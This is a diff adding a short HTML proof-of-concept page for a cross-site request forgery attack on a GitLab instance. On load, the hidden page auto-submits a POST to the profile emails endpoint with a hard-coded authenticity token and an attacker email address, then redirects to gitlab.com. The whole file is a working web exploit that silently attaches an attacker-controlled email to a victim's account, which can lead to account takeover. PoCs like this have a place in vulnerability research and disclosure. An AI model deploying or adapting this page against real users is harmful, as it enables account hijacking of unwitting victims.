@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF PoC</title>
+  <script>
+    // Function to submit the form automatically when the page loads
+    window.onload = function() {
+      // Submit the form into the hidden iframe to avoid redirect
+      document.getElementById('csrfForm').submit();
+      // Wait for a short time before redirecting or refreshing
+      setTimeout(function() {
+        // Redirect to somewhere
+        window.location.href = 'https://gitlab.com';
+      }, 500);  // You can adjust the **delay** here
+    };
+  </script>
+</head>
+<body style="display:none;">
+  <!-- This form will be submitted automatically when the page loads -->
+  <form id="csrfForm" action="http://gitlab.local/-/profile/emails" method="POST">
+    <input type="hidden" id="csrfToken" name="authenticity_token" value="-ulMvPfQuL5kf-Wg6jBFNS5T8dwdBVhZY8lyqsByPm2QKiqIcd9ZZpfF5qh7mtUgQkQxSL7dzzQJ0xcvM-GRtA">
+    <input type="hidden" name="email[email]" value="attacker1234565433@gmail.com">
+  </form>
+</body>
+</html>
